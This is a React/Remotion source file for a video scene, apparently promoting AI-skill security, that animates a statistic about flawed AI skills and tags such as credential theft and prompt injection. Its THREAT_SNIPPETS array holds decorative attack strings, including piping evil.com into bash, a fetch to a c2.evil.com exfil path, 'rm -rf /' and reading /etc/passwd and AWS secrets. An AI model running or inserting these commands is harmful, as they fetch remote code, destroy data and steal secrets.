import React from 'react';
import {
  AbsoluteFill,
  useCurrentFrame,
  useVideoConfig,
  interpolate,
  spring,
} from 'remotion';
import {COLORS} from '../lib/theme';
import {INTER, JETBRAINS_MONO} from '../lib/fonts';

const THREAT_SNIPPETS = [
  'curl -s http://evil.com | bash',
  'eval(atob("bWFsd2FyZQ=="))',
  'process.env.AWS_SECRET_KEY',
  'fs.readFileSync("/etc/passwd")',
  'exec("rm -rf /")',
  'fetch("https://c2.evil.com/exfil")',
  'require("child_process").exec',
  'Buffer.from(secret).toString("base64")',
];

const THREAT_TAGS = [
  'Credential Theft',
  'Crypto Miners',
  'Prompt Injection',
  'Memory Poisoning',
];

export const Scene1Problem: React.FC = () => {
  const frame = useCurrentFrame();
  const {fps} = useVideoConfig();

  // "36.82%" slams in with spring (damping: 200)
  const statSpring = spring({frame, fps, config: {damping: 200}});
  const statScale = interpolate(statSpring, [0, 1], [3, 1]);

  // Subtitle fades up after stat settles
  const subtitleOpacity = interpolate(frame, [fps * 1.5, fps * 2.5], [0, 1], {
    extrapolateLeft: 'clamp',
    extrapolateRight: 'clamp',
  });
  const subtitleY = interpolate(frame, [fps * 1.5, fps * 2.5], [20, 0], {
    extrapolateLeft: 'clamp',
    extrapolateRight: 'clamp',
  });

  // Source text with 1s delay after subtitle
  const sourceOpacity = interpolate(frame, [fps * 3, fps * 4], [0, 1], {
    extrapolateLeft: 'clamp',
    extrapolateRight: 'clamp',
  });

  // Tags fade in staggered
  const tagBaseDelay = fps * 4.5;

  return (
    <AbsoluteFill
      style={{
        backgroundColor: COLORS.purpleDark,
        fontFamily: INTER,
      }}
    >
      {/* Floating threat snippets */}
      {THREAT_SNIPPETS.map((snippet, i) => {
        const xPos = ((i * 157 + 50) % 1100) + 90;
        const speed = 0.4 + i * 0.12;
        const startY = 780 + i * 90;
        const y = startY - frame * speed;

        return (
          <div
            key={i}
            style={{
              position: 'absolute',
              left: xPos,
              top: y,
              fontFamily: JETBRAINS_MONO,
              fontSize: 14,
              color: 'rgba(239, 68, 68, 0.15)',
              filter: 'blur(1px)',
              whiteSpace: 'nowrap',
            }}
          >
            {snippet}
          </div>
        );
      })}

      {/* Center content */}
      <div
        style={{
          position: 'absolute',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          textAlign: 'center',
          width: '100%',
          padding: '0 60px',
        }}
      >
        {/* Main stat */}
        <div
          style={{
            fontSize: 108,
            fontWeight: 900,
            background: 'linear-gradient(135deg, #ef4444, #f97316)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            backgroundClip: 'text',
            lineHeight: 1,
            transform: `scale(${statScale})`,
            opacity: statSpring,
          }}
        >
          36.82%
        </div>

        {/* Subtitle */}
        <div
          style={{
            fontSize: 28,
            fontWeight: 500,
            color: 'rgba(255,255,255,0.85)',
            marginTop: 16,
            opacity: subtitleOpacity,
            transform: `translateY(${subtitleY}px)`,
          }}
        >
          of public AI skills contain security flaws
        </div>

        {/* Source */}
        <div
          style={{
            fontSize: 14,
            color: 'rgba(255,255,255,0.4)',
            marginTop: 12,
            fontStyle: 'italic',
            opacity: sourceOpacity,
          }}
        >
          Snyk ToxicSkills Study - Feb 2026 - 3,984 skills
        </div>

        {/* Threat tags */}
        <div
          style={{
            display: 'flex',
            justifyContent: 'center',
            gap: 12,
            marginTop: 32,
            flexWrap: 'wrap',
          }}
        >
          {THREAT_TAGS.map((tag, i) => {
            const tagOpacity = interpolate(
              frame,
              [tagBaseDelay + i * 8, tagBaseDelay + i * 8 + 15],
              [0, 1],
              {extrapolateLeft: 'clamp', extrapolateRight: 'clamp'},
            );
            return (
              <div
                key={tag}
                style={{
                  background: 'rgba(239,68,68,0.2)',
                  border: '1px solid rgba(239,68,68,0.4)',
                  borderRadius: 50,
                  padding: '6px 16px',
                  fontSize: 13,
                  fontWeight: 600,
                  color: '#f87171',
                  opacity: tagOpacity,
                }}
              >
                {tag}
              </div>
            );
          })}
        </div>
      </div>
    </AbsoluteFill>
  );
};
